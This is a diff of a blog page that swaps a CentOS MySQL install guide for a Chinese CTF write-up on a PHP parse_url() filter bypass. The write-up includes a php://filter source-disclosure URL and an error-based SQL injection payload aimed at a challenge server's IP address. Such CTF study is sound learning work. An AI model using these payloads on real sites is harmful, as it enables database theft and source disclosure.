@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="mysql," />
+  <meta name="keywords" content="ctf," />
 
 
 
@@ -79,26 +79,24 @@
 
 
 
-<meta name="description" content="centos7安装mysql由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql 1.卸载之前安装的MariaDB rpm -qa | grep mariadb(列出所有被安装的rpm package) rpm -e依次卸载 rpm">
-<meta name="keywords" content="mysql">
+<meta name="description" content="php parse_url()函数的漏洞在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤 来看代码 &amp;lt;?php $url=parse_url($_SERVER[&amp;apos;REQUEST_URI&amp;apos;]); parse_str($url[&amp;apos;query&amp;apos;],$query); var_d">
+<meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="centos7安装mysql">
-<meta property="og:url" content="http://yoursite.com/2018/02/27/centos7mysql/index.html">
+<meta property="og:title" content="php parse_url()函数的漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/05/13/parse_url/index.html">
 <meta property="og:site_name" content="Lawliet Blog">
-<meta property="og:description" content="centos7安装mysql由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql 1.卸载之前安装的MariaDB rpm -qa | grep mariadb(列出所有被安装的rpm package) rpm -e依次卸载 rpm">
+<meta property="og:description" content="php parse_url()函数的漏洞在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤 来看代码 &amp;lt;?php $url=parse_url($_SERVER[&amp;apos;REQUEST_URI&amp;apos;]); parse_str($url[&amp;apos;query&amp;apos;],$query); var_d">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/l9iEaD0a5a.PNG">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/Fdg5fbh339.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/B3fC28IJjm.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/BkFBCkAj2I.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/2jih4JIeeF.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/3iAGB7h54A.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/lG0d7L9Dc7.png?imageslim">
-<meta property="og:updated_time" content="2018-02-27T14:22:09.592Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180513/acDbC5lEe8.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180513/EbCH4hKH9b.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180513/0I4Bkl3ibm.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180513/fgjlla414b.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180513/3Lh2A7BimG.png?imageslim">
+<meta property="og:updated_time" content="2018-05-13T15:54:11.077Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="centos7安装mysql">
-<meta name="twitter:description" content="centos7安装mysql由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql 1.卸载之前安装的MariaDB rpm -qa | grep mariadb(列出所有被安装的rpm package) rpm -e依次卸载 rpm">
-<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180227/l9iEaD0a5a.PNG">
+<meta name="twitter:title" content="php parse_url()函数的漏洞">
+<meta name="twitter:description" content="php parse_url()函数的漏洞在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤 来看代码 &amp;lt;?php $url=parse_url($_SERVER[&amp;apos;REQUEST_URI&amp;apos;]); parse_str($url[&amp;apos;query&amp;apos;],$query); var_d">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180513/acDbC5lEe8.png?imageslim">
 
 
 
@@ -128,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/02/27/centos7mysql/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/05/13/parse_url/"/>
 
 
 
 
 
-  <title>centos7安装mysql | Lawliet Blog</title>
+  <title>php parse_url()函数的漏洞 | Lawliet Blog</title>
   
 
 
@@ -261,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/27/centos7mysql/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/13/parse_url/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lawliet">
@@ -278,7 +276,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">centos7安装mysql</h1>
+          <h1 class="post-title" itemprop="name headline">php parse_url()函数的漏洞</h1>
         
 
         <div class="post-meta">
@@ -290,8 +288,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-27T22:34:28+08:00">
-                2018-02-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-13T18:11:57+08:00">
+                2018-05-13
               </time>
             
 
@@ -313,8 +311,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/其他/" itemprop="url" rel="index">
-                    <span itemprop="name">其他</span>
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
                   </a>
                 </span>
 
@@ -350,21 +348,67 @@
       
 
       
-        <h1 id="centos7安装mysql"><a href="#centos7安装mysql" class="headerlink" title="centos7安装mysql"></a>centos7安装mysql</h1><p><strong>由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql</strong></p>
-<p><strong>1.卸载之前安装的MariaDB</strong></p>
-<pre><code>rpm -qa | grep mariadb(列出所有被安装的rpm package)
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/l9iEaD0a5a.PNG" alt="mark"><br><strong><code>rpm -e</code>依次卸载</strong></p>
-<pre><code>rpm -e mariadb-5.5.56-2.el7.x86_64
-rpm -e --nodeps mariadb-libs-5.5.56-2.el7.x86_64
-rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64
-</code></pre><p><strong>2.到<a href="https://dev.mysql.com/downloads/repo/yum/" title="mysql官网" target="_blank" rel="external">mysql官网</a>找到对应版本的mysql下载（本例中为mysql57-community-release-el7-11.noarch.rpm），上传至服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/Fdg5fbh339.png?imageslim" alt="mark"></p>
-<p><strong>3.下载完毕后输入<code>md5sum mysql57-community-release-el7-9.noarch.rpm</code>生成MD5值并确保同官方网站上的MD5值相同。注意：建议运行此命令以确保文件无损坏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/B3fC28IJjm.png?imageslim" alt="mark"></p>
-<p><strong>4.输入<code>rpm -ivh mysql57-community-release-el7-9.noarch.rpm</code>并按回车键进行安装YUM源RPM安装包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/BkFBCkAj2I.png?imageslim" alt="mark"></p>
-<p><strong>5.因上一步已添加新的YUM存储库，所以直接就可以用yum命令安装mysql了</strong></p>
-<pre><code>yum install -y mysql-server
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/2jih4JIeeF.png?imageslim" alt="mark"></p>
-<p><strong>6.可以看到mysql已经成功安装</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/3iAGB7h54A.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/lG0d7L9Dc7.png?imageslim" alt="mark"></p>
+        <h1 id="php-parse-url-函数的漏洞"><a href="#php-parse-url-函数的漏洞" class="headerlink" title="php parse_url()函数的漏洞"></a>php parse_url()函数的漏洞</h1><p><strong>在ctf比赛中经常遇到的一个知识点，记录一下，由于parse_url函数在解析url时存在的bug导致在某些情况下可以绕过正则的过滤</strong></p>
+<p><strong>来看代码</strong></p>
+<pre><code>&lt;?php
+$url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
+parse_str($url[&apos;query&apos;],$query);
+var_dump($query); 
+?&gt;
+</code></pre><p><strong>访问url：<a href="http://127.0.0.1/info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1/info/parseurl.php?sql=select</a></strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/acDbC5lEe8.png?imageslim" alt="mark"><br><strong>这里会是url中正常的参数值</strong></p>
+<p><strong>如果访问url:<a href="http://127.0.0.1///info/parseurl.php?sql=select" target="_blank" rel="external">http://127.0.0.1///info/parseurl.php?sql=select</a></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/EbCH4hKH9b.png?imageslim" alt="mark"><br><strong>这时将不能正常返回url中的参数值，遇到这样格式的连接，parse_url函数将会返回False，这种情况下可能会绕过某些waf的过滤</strong></p>
+<p><strong>来看一道ctf题</strong></p>
+<pre><code>http://118.126.113.78/web1/?id=1
+</code></pre><p><strong>已经确定id参数存在过滤，fuzz了一下，大概过滤了and,select,union,from等sql关键字，导致union注入和报错注入都失败，根据页面源代码的提示我们可以利用php伪协议读取出页面源代码看看它究竟是怎么样过滤的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/0I4Bkl3ibm.png?imageslim" alt="mark"><br><strong>利用php伪协议文件包含读取waf.php的源代码</strong>    </p>
+<pre><code>http://118.126.113.78/web1/?file=php://filter/convert.base64-encode/resource=waf.php
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/fgjlla414b.png?imageslim" alt="mark"></p>
+<pre><code>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRfR0VUPUFkZF9TKCRfR0VUKTsNCiRfUE9TVD1BZGRfUygkX1BPU1QpOw0KJF9DT09LSUU9QWRkX1MoJF9DT09LSUUpOw0KJF9SRVFVRVNUPUFkZF9TKCRfUkVRVUVTVCk7DQpmdW5jdGlvbiBBZGRfUygkYXJyYXkpDQp7DQpmb3JlYWNoKCRhcnJheSBhcyAka2V5PT4kdmFsdWUpew0KICAgICAgICAgICAgICAgIGlmKCFpc19hcnJheSgkdmFsdWUpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICRjaGVjaz0gcHJlZ19tYXRjaCgnL3JlZ2V4cHxhbmR8bGlrZXxcInwlfGluc2VydHx1cGRhdGV8ZGVsZXRlfHVuaW9ufGludG98bG9hZF9maWxlfG91dGZpbGV8XC9cKi9pJywgJHZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRjaGVjaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJIYWNrZXIhIik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICAkYXJyYXlbJGtleV09QWRkX1MoJGFycmF5WyRrZXldKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgIH0NCnJldHVybiAkYXJyYXk7DQp9DQoNCmZ1bmN0aW9uIE1lYXN1cmVtZW50X3VybCgpDQp7DQogICAgJHVybD1wYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgJEtleXdvcmQ9YXJyYXkoImZyb20iLCJzZWxlY3QiLCJsaWtlIiwib3IiKTsNCiAgICBmb3JlYWNoKCRxdWVyeSBhcyAka2V5KQ0KICB7DQogICAgICAgIGZvcmVhY2goJEtleXdvcmQgYXMgJHZhbHVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvIi4kdmFsdWUuIi8iLHN0cnRvbG93ZXIoJGtleSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGRpZSgiZnVjayB1ISIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4NCg==
+</code></pre><p><strong>base64解码后</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+$_GET=Add_S($_GET);
+$_POST=Add_S($_POST);
+$_COOKIE=Add_S($_COOKIE);
+$_REQUEST=Add_S($_REQUEST);
+function Add_S($array)
+{
+foreach($array as $key=&gt;$value){
+            if(!is_array($value)){
+                    $check= preg_match(&apos;/regexp|and|like|\&quot;|%|insert|update|delete|union|into|load_file|outfile|\/\*/i&apos;, $value);
+                    if($check)
+                            {
+                            exit(&quot;Hacker!&quot;);
+                    }
+            }else{
+                    $array[$key]=Add_S($array[$key]);
+            }
+    }
+return $array;
+}
 
+function Measurement_url()
+{
+    $url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
+    parse_str($url[&apos;query&apos;],$query);
+    $Keyword=array(&quot;from&quot;,&quot;select&quot;,&quot;like&quot;,&quot;or&quot;);
+    foreach($query as $key)
+    {
+    foreach($Keyword as $value)
+    {
+        if(preg_match(&quot;/&quot;.$value.&quot;/&quot;,strtolower($key)))
+        {
+            die(&quot;fuck u!&quot;);
+        }
+    }
+}
+}
+?&gt;
+</code></pre><p><strong>可以看到其实是写了两个函数分别过滤的，其中<code>ADD_S</code>函数确实是将其里面定义的黑名单sql关键字过滤死了，但是<code>Measurement_url</code>函数中接收url参数值确是通过的<code>parse_url</code>这个函数，之前文章开头也讲到了，使用这个函数取url参数时，会因为url的格式出现一些问题导致该函数返回Flase而绕过过滤，所以我们确定了真正被过滤的关键字只有<code>ADD_S</code>中的那些关键字，而单单过滤这些关键字是不够的，这样我们便通过<code>parse_url</code>函数的漏洞去绕过黑名单的检查，最终读取flag的payload</strong></p>
+<pre><code>http://118.126.113.78///web1/?id=1&apos; ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+
+</code></pre><p><strong>（对select，from的过滤就可以通过parse_url这个函数的漏洞绕过）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/3Lh2A7BimG.png?imageslim" alt="mark"></p>
+<pre><code>XPATH syntax error: &apos;:flag{WE_ARe_FaMiLy!1234567}:&apos;
+</code></pre>
       
     </div>
     
@@ -381,7 +425,7 @@ rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64
       
         <div class="post-tags">
           
-            <a href="/tags/mysql/" rel="tag"># mysql</a>
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
           
         </div>
       
@@ -394,8 +438,8 @@ rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/01/12/arpattack/" rel="next" title="arp协议分析&python编程实现arp欺骗抓图片">
-                <i class="fa fa-chevron-left"></i> arp协议分析&python编程实现arp欺骗抓图片
+              <a href="/2018/04/19/wificrack/" rel="next" title="kali无线网卡wifi破解">
+                <i class="fa fa-chevron-left"></i> kali无线网卡wifi破解
               </a>
             
           </div>
@@ -403,10 +447,6 @@ rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/12/N1CTF2018/" rel="prev" title="N1CTF2018 77777 writeup">
-                N1CTF2018 77777 writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -566,7 +606,7 @@ rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#centos7安装mysql"><span class="nav-number">1.</span> <span class="nav-text">centos7安装mysql</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php-parse-url-函数的漏洞"><span class="nav-number">1.</span> <span class="nav-text">php parse_url()函数的漏洞</span></a></li></ol></div>
             
 
           </div>
